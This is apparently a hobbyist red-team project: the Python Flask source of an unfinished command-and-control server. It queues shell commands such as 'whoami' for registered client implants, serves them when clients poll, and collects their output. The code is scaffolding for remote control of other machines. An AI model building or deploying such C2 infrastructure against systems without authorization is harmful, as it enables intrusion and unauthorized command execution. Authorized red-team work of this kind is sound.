from flask import Flask, request, jsonify, render_template
import requests
from datetime import datetime

SERVER_URL = "http://127.0.0.1:5005"
app = Flask(__name__)
print("Drew was here")

#TODO: 
# client check in but only run if cmd changes
# get rid of current_command ):

# current_command = "whoami" # have something as the default command, just making sure that connection is maintained.
client_commands = {} # 'client_id': 'command' --> to handle commands for specific clients
clients = [] # just to see what clients we got rn

@app.route('/home')
def home():
    return render_template('home.html')


@app.route('/input-command', methods=['GET', 'POST'])
def input():
    if request.method == 'POST':
    #     global current_command
        command_input = request.form.get('command')
    #     print("!!!!!!!!!!current command:", current_command)
    #     return render_template('home.html', message="command received: "+str(current_command)) # i dont like this. NEED a return statement though
    # client_id = request.form.get('client_id', 'all') # default to all if no specific client
    # timestamp = datetime.now()
    # if client_id == 'all':
    #     for c in client_commands:
    #         client_commands[c] = {"command": command, "timestamp": timestamp}
    # else:
    #     client_commands[client_id] = {"command": command, "timestamp": timestamp} # log command w/ timestamp
    # return render_template('home.html', message="command received: "+str(current_command)) # do something about this
    try:
        cmd, client_id = command_input.split(maxsplit=1) # splits it at only first occurrence of whitespace. so fire
        print("!!!!CLIENT ID: " + client_id)
        print("!!!!CMD: " + cmd)
        client_commands[client_id] = {'command': cmd, 'timestamp': datetime.now()}
    except ValueError:
        return render_template('home.html', message="invalid input")
    # client_commands[client_id] = {'command': cmd, 'timestamp': datetime.now()}
    return render_template('home.html', message=f"Command received for {client_id}: {cmd}")


@app.route('/command', methods=['GET']) # CURRENTLY FIXING THIS
def send_command():
    client_id = request.args.get('client_id') # defaults to None apparently?
    # client_id = next(reversed(client_commands)) # thank you chatgpt
    # cmd = client_commands[client_id]['command']
    cmd = client_commands.get(client_id)

    # handle commands to specific clients
    # syntax: [command] [client_id]
    # if len(current_command.split()) > 1: # if command was given w/ client arg
    #     cmd = current_command.split()[0]
    #     client_id = current_command.split()[1]
    #     client_commands[client_id] = cmd
    # else:
    #     cmd = current_command
    # client_commands[client_id] = ""

    # print("CLIENT ID ")
    # print(client_id)
    if client_id in clients: # if valid client id was parsed
        print("valid client")
        cmd_info = client_commands.get(client_id, None)
        if cmd_info and ((datetime.now() - cmd_info['timestamp']).total_seconds() < 5): # if command is valid and was issued within the last 5 secs
            print("sup")
            return jsonify(status="sent", client_id=client_id, command=cmd_info['command']) # send to a specific client
        else:
            return jsonify(status="no command", client_id=client_id)
    return jsonify(status="sent", command=cmd) # otherwise send to all
    #TODO: FIX SEND TO ALL
    # return jsonify(status="unsent", command="") # invalid client_id

@app.route('/register-client', methods=['GET'])
def register_client():
    # print("register_client function")
    client_id = request.args.get('client_id') # retrieves the value associated with the key 'client_id' from the query string, or None if it does not exist
    # client_id = "test"
    # print(client_id)
    if client_id not in clients:
        clients.append(client_id)
    if client_id not in client_commands:
        client_commands[client_id] = {"command": None, "timestamp": datetime.min}
    return jsonify(status="client registered", client_id=client_id)


@app.route('/', methods=['POST']) # callbacks
def command_result():
    result = request.json.get('result') # GET from client
    # wtf is a result rename that
    status = request.args.get('status')
    print("!!!!!!!!!!client command result:\n" + result)
    return jsonify({"status": "success"})


@app.route('/clients')
def show_clients():
    return clients


if __name__ == '__main__':
    # app.run(debug=True, host='0.0.0.0', port=5005, threaded=True, ssl_context=('/Users/leahk/workspace/projects/redteam/C2/cert.pem', '/Users/leahk/workspace/projects/redteam/C2/key.pem'))
    app.run(debug=True, host='0.0.0.0', port=5005, threaded=True)
    # app.run(host='127.0.0.1', port=5000, threaded=True)